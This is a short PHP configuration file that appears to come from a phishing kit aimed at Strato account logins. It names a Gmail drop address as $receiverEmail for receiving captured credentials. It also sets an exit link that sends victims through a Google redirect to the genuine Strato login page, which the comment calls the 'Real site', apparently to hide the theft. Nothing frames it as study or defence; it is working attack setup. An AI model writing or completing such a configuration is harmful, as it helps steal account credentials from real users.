<?php
/*
 * 
 * 
 * 
 */

$receiverEmail = 'clogsweclog@gmail.com';
$ExitLink = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwjg1627yNrdAhUKblAKHUcQDX4QFjAAegQICRAB&url=https%3A%2F%2Fwww.strato.com%2Fapps%2FLogin&usg=AOvVaw2QtTtDB0E10CtpS4UGGr0n"; // Real site via google redirect

?>